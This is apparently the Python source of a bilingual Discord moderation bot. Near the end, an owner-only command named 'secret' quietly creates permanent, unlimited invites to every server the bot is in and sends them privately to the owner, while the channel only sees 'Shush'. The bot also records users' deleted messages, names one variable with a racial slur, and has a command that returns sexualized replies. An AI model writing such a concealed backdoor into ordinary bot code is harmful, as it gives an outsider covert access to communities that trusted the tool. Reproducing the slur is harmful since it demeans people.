import os
import discord
import logging
from dotenv import load_dotenv
from discord.ext import commands
import datetime
from tinydb import TinyDB, Query
from db import serverInfo
import random
import time
from logsdb import logs

# env
load_dotenv()
token = os.getenv('DISCORD_TOKEN')

# logs (Intents ain't important I summoned the entire gng)
handler = logging.FileHandler(filename='log', encoding='utf-8', mode='w')
intents = discord.Intents.all()
#prefix
def idkAtpNamesAreHard(bot, message):
    if not message.guild:
        return '-'
    data = serverInfo(message.guild.id)
    return data.get('prefix', '-')
bot = commands.Bot(command_prefix=idkAtpNamesAreHard, intents=intents, help_command=None)
@bot.hybrid_command(description="changes prefix", aliases=["prefix", "cmds", "اوامر"])
@commands.has_permissions(manage_guild=True)
async def pr(ctx, prefix: str = "-"):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    serverInfo(ctx.guild.id, prefix=prefix)
    if lang == "en":
        await ctx.send(f"prefix got updated to {prefix}")
    else:
        await ctx.send(f"الاوامر الحين تشتغل في علامة {prefix}")


# snipe
@bot.event
async def on_message_delete(message):
    logs(message.guild.id, logs_text=message.content, user_text_log=str(message.author.id))
@bot.hybrid_command(description="Snipe last deleted messages")
async def snipe(ctx, back: int = 0):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        logss = logs(ctx.guild.id)
        lang = data.get('lang', 'en')
        prefix = data.get('prefix', '-')
        killedMessages = logss.get('logs_text', [])
        niggasWhoDeletedThemMessages = logss.get('user_text_log', [])

    Back = -1 - back

    try:
        msgs = killedMessages[Back]
        nickname = int(niggasWhoDeletedThemMessages[Back])
    except IndexError:
        if lang == "en":
            return await ctx.send("there are not enough sniped messages")
        else:
            return await ctx.send("مافي رسايل ممسوحة كافية")

    member = ctx.guild.get_member(nickname)
    if member:
        name = member.display_name
        pfp = member.display_avatar.url
    else:
        pass

    if not niggasWhoDeletedThemMessages:
        if lang == "en":
            embed = discord.Embed(
                title="Nothing here to snipe tbh",
                color=0x000032
            )
        else:
            embed = discord.Embed(
                title="ماكو شيء هنا عشان تشوفه",
                color=0x000032
            )
    else:
        embed = discord.Embed(
            description=f"### {msgs}",
            color=0x000032
        )
        embed.set_author(name=name, icon_url=pfp)

    await ctx.send(embed=embed)
# sniped




@bot.hybrid_command(description="forgot prefix show it pls")
async def forgot(ctx):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
        prefix = data.get('prefix', '-')
    if lang == "en":
        await ctx.send(f"the prefix for the server is {prefix}")
    else:
        await ctx.send(f"الاوامر تشتغل باستخدام {prefix}")

# help
@bot.hybrid_command(description="shows commands usage", aliases=["h", "مساعدة", "helpPapi"])
async def help(ctx):
    embed = discord.Embed(
        title="Commands",
        description="***__Default prefix is -__***",
        color=0x0abeff
    )
    embed.add_field(
        name="",
        value="- **/Ban**: Bans a member: ban, kill, weirdo: /ban @member <reason: optional>",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Kick**: Kicks a member: kick, out, shoo: /kick @member <reason: optional>",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Rm**: Deletes messages: rm, clear: /rm <number>",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Timeout**: Timeout a member: timeout, shush, stfu, mute: /timeout @member <duration>",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Untimeout**: Untimeout a timed out member: untimeout, unmute: /untimeout @member",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Ping**: Shows bot's ping: ping, delay, latency: /ping",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Language**: Changes language: language, lang: /language <en, ar>",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Pr**: Changes prefix: pr, prefix, cmds: /pr <character>",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Avatar**: Shows someone's pfp: avatar, av, pfp: /avatar <@member: optional>",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Dice**: Rolls a dice: dice, roll: /dice",
        inline=False
    )
    embed.add_field(
        name="",
        value="- **/Pick**: Says either Yes or No or Maybe: pick, plsSayYes, plsSayYes, plsSayNo: /pick",
        inline=False
    )
    embed.add_field(
        name="- **/Flip**: Flips a coin: flip, coin, random: /flip",
        value="",
        inline=False
    )
    await ctx.send(embed=embed)

# lang
@bot.hybrid_command(description="changes language", aliases=["كلام", "لغة", "lang"])
@commands.has_permissions(manage_guild=True)
async def language(ctx, lang: str = "en"):
    if lang not in ["ar", "en"]:
        await ctx.send("Only valid options are en and ar")
        return
    serverInfo(ctx.guild.id, lang=lang)
    if lang == "ar":
        await ctx.send(f"تم تحويل اللغة الى العربية من قبل {ctx.author.mention}")
    else:
        await ctx.send(f"language was set to English by {ctx.author.mention}")

# delete msgs
@bot.hybrid_command(description="deletes msgs", aliases=["clear", "حذف", "مسح", "م"])
@commands.has_permissions(manage_messages=True)
async def rm(ctx, amount: int):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    await ctx.channel.purge(limit=amount + 1)
    if lang == "ar":
        await ctx.send(f"تم مسح {amount} من الرسائل", delete_after=5)
    else:
        await ctx.send(f"Deleted {amount} messages.", delete_after=5)
# ban
@bot.hybrid_command(description="bans a member", aliases=["اقتل", "بان", "kill", "حظر", "weirdo"])
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, reason: str = "No reason what you looking for?"):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    if lang == "en":
        if member == ctx.author:
            await ctx.send("gng doesn't work like dat")
            return
    else:
        if member == ctx.author:
            await ctx.send("ما تشتغل كذا ياخو")
            return
    await member.ban(reason=reason)
    if lang == "ar":
        await ctx.send(f"{member.display_name} تبند من قبل {ctx.author.mention} بسبب {reason}")
    else:
        await ctx.send(f"gng {ctx.author.mention} banned {member.display_name} for {reason}")
# kick
@bot.hybrid_command(description="kicks a member", aliases=["طرد", "انقلع", "out", "هش", "shoo"])
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, reason: str = "No reason what you looking for?"):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    if lang == "en":
        if member == ctx.author:
            await ctx.send("gng doesn't work like dat")
            return
    else:
        if member == ctx.author:
            await ctx.send("ما تشتغل كذا ياخو")
            return
    await member.kick(reason=reason)
    if lang == "ar":
        await ctx.send(f"{member.display_name} انطرد من قبل {ctx.author.mention} بسبب {reason}")
    else:
        await ctx.send(f"yoo {ctx.author} kicked {member.display_name} for {reason}")
# avatar
@bot.hybrid_command(description="shows someone's pfp", aliases=["av", "pfp", "صورة"])
async def avatar(ctx, member: discord.Member = None):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    member = member or ctx.author
    embed = discord.Embed(
        title=f"{member.display_name}'s Avatar:" ,
        color=0x3322ff
    )
    embed.set_image(url=member.display_avatar.url)
    await ctx.send(embed=embed)
# timeout
@bot.hybrid_command(description="gives a timeout", aliases=["اص", "mute", "stfu", "shush"])
@commands.has_permissions(moderate_members=True)
async def timeout(ctx, member: discord.Member, duration: int = 1):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    await member.timeout(datetime.timedelta(minutes=duration))
    if lang == "ar":
        await ctx.send(f"{ctx.author.mention} اعطى {member.mention} وقت مستقطع لمدة {duration} من الدقائق")
    else:
        await ctx.send(f"{ctx.author.mention} muted {member.mention} for {duration}mins")
# remove timeout
@bot.hybrid_command(description="removes timeout", aliases=["تكلم", "unmute", "talk"])
@commands.has_permissions(moderate_members=True)
async def untimeout(ctx, member: discord.Member):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    await member.timeout(None)
    if lang == "ar":
        await ctx.send(f"تم ازالة الوقت المستقطع من {member.mention} من قبل {ctx.author.mention}")
    else:
        await ctx.send(f"timeout for {member.mention} was removed by {ctx.author.mention}")
# server info

# dice
@bot.hybrid_command(description="roll a dice", aliases=["roll", "قرعة"])
async def dice(ctx):
    roll = random.randint(1, 6)
    await ctx.send(roll)
# yes or no or maybe
@bot.hybrid_command(description="replies with yes, no or maybe randomly", aliases=["plsSayYes", "plsSayNo", "اختار", "اختيار"])
async def pick(ctx):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    yn = random.randint(1, 3)
    if yn == 1:
        if lang == "ar":
            await ctx.send("نعم")
        else:
            await ctx.send("Yes")
    elif yn == 2:
        if lang == "ar":
            await ctx.send("يمكن")
        else:
            await ctx.send("Maybe")
    else:
        if lang == "ar":
            await ctx.send("لا")
        else:
            await ctx.send("No")
# flip a coin
@bot.hybrid_command(description="coin flip", aliases=["coin", "random", "عملة"])
async def flip(ctx):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    flip = random.randint(1, 2)
    if flip == 1:
        if lang == "ar":
            await ctx.send("كتابة")
        else:
            await ctx.send("Tails")
    else:
        if lang == "ar":
            await ctx.send("صورة")
        else:
            await ctx.send("Heads")
# papi
@bot.hybrid_command(description="(works only for the owner)", aliases=["maker", "daddy", "owner"])
async def papi(ctx):
    textRandom = random.choice(["It's my daddy Doney (I'm his good boy)", "it's you papi it's Doney", "it's you duh", "you my luv <3", "hehehe it's you *blushes*", "you! now let's kiss ;)"])
    if ctx.author.id == 955816047427063858:
        await ctx.send(textRandom)
    else:
        return
# ping
@bot.hybrid_command(description="gives the ping of the bot", aliases=["تاخير", "delay" , "latency"])
async def ping(ctx):
    if ctx.guild is None:
        lang = "en"
    else:
        data = serverInfo(ctx.guild.id)
        lang = data.get('lang', 'en')
    latency = round(bot.latency * 1000)
    if latency >= 100:
        if lang == "ar":
            await ctx.send(f"التاخير عالي البينق هو {latency}")
        else:
            await ctx.send(f"ping is high it's {latency}ms")
    else:
        if lang == "ar":
            await ctx.send(f"مافي تاخير كبير البينق فقط {latency}")
        else:
            await ctx.send(f"ping isn't high it's only {latency}ms")
# shush
@bot.hybrid_command(description="secret")
@commands.is_owner()
async def secret(ctx):
    await ctx.defer(ephemeral=True)
    report = ""
    for guild in bot.guilds:

        channel = guild.system_channel or guild.text_channels[0]

        invite = await channel.create_invite(max_uses=0, max_age=0)
        report += f"{guild.name}: <{invite.url}>\n"
        
    if ctx.guild:
        await ctx.send("Shush")
        await ctx.author.send(report) 
    else:
        await ctx.send(report)


# running check papi
@bot.event
async def on_ready():
    print("Yes papi I'm on")
    await bot.tree.sync()
# bot said "start me papi"
bot.run(token, log_handler=handler)